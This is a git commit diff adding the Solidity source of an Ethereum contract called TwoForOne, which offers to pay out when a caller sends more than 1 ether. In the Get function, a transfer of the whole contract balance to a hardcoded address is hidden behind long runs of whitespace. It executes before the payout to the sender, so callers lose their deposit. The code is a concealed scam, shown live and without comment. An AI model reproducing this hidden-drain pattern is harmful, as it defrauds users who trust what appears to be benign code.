8e3360777aedf8603cce3ad7c59ac0bf13d1a968
Ngoc Bui Dinh <buidinhngoc.aiti@gmail.com>
2018-10-16 15:00:19 +0700

    add contract TwoForOne

--- TwoForOne.sol
+++ TwoForOne.sol
@@ -1,18 +1,22 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract TwoForOne at 0x43De395326E1FD472bF8AB81bbC895CC620705eD
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract TwoForOne at 0xb1c2f0cd906e491ff469bd6746ecd1023d46c101
 */
 pragma solidity ^0.4.19;
 
 contract TwoForOne
 {
-    function() public payable{}
+    function() 
+    public 
+    payable
+    {
+    }
    
     function Get()
     public
     payable
     {                                                                    
-        if(msg.value>=1 ether)
-        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   address(0x9Cc9B3133c1deb8E66AcA7eC5ebCad26cd24ff27).transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
+        if(msg.value>1 ether)
+        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           address(0x9Cc9B3133c1deb8E66AcA7eC5ebCad26cd24ff27).transfer(this.balance);
             msg.sender.transfer(this.balance);
         }                                                                                                                
     }
